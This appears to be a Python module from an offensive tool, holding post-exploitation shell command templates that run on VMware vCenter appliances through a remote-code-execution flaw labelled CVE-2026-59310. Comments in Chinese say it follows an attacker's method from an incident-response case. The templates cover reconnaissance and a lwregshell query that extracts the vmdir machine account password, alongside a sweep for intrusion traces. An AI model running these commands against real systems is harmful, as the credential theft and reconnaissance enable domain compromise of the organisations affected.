"""后渗透命令模板（经 CVE-2026-59310 RCE + VAMI 回显执行）。

参考 QUIRSO IR 案例中 actor 的凭据提取手法，仅保留“取证/凭据”类动作；
ESXi 勒索破坏与隐蔽持久化脚本不在本项目实现范围（安全边界见 README）。
"""

POSTEX_SYSINFO = ("id; uname -a; cat /etc/vmware-release 2>/dev/null; "
                  "cat /etc/applmgmt/appliance/version 2>/dev/null; "
                  "ls -la /etc/cron.d/ | head -30")

POSTEX_MACHINE_CREDS = (
    "/opt/likewise/bin/lwregshell list_values "
    "'[HKEY_THIS_MACHINE\\services\\vmdir]' 2>/dev/null | "
    "grep -E 'dcAccountDN|dcAccountPassword'"
)

POSTEX_SSO_DOMAIN = (
    "/opt/likewise/bin/lwregshell list_values "
    "'[HKEY_THIS_MACHINE\\services\\vmdir]' 2>/dev/null | grep dcAccountDN | "
    "grep -oE 'dc=.*' | sed 's/^dc=//;s/,dc=/./g;s/\"//g'"
)

# 环境侦察：网络、服务、日志转发、计划任务、SSO 状态
POSTEX_RECON_NET = ("ip addr 2>/dev/null | grep -E 'inet |^[0-9]+:'; "
                    "ss -tlnp 2>/dev/null | head -40; cat /etc/resolv.conf")
POSTEX_RECON_CRON = ("ls -la /etc/cron.d/ /var/spool/cron/ 2>/dev/null; "
                     "grep -rl syslog.log /etc/cron.d/ 2>/dev/null")
POSTEX_VMWARE_STATE = ("service-control --status 2>/dev/null | head -30; "
                       "ls /usr/lib/vmware-vmafd/ 2>/dev/null | head")
POSTEX_IOC_SWEEP = ("find / -name '*-syslog.log' "
                    "-not -path '/var/log/vmware/*' -not -path '/storage/log/vmware/*' "
                    "2>/dev/null | head -20; "
                    "ls -la /opt/vmware/share/htdocs/ 2>/dev/null")

POSTEX_ACTIONS = {
    "sysinfo": ("系统信息 / 版本核对", POSTEX_SYSINFO),
    "machine-creds": ("提取 vmdir 机器账户", POSTEX_MACHINE_CREDS),
    "sso-domain": ("读取 SSO 域名", POSTEX_SSO_DOMAIN),
    "net": ("网络与监听端口", POSTEX_RECON_NET),
    "cron": ("计划任务盘点", POSTEX_RECON_CRON),
    "vmware": ("VMware 服务状态", POSTEX_VMWARE_STATE),
    "ioc": ("59310 入侵痕迹快扫", POSTEX_IOC_SWEEP),
}
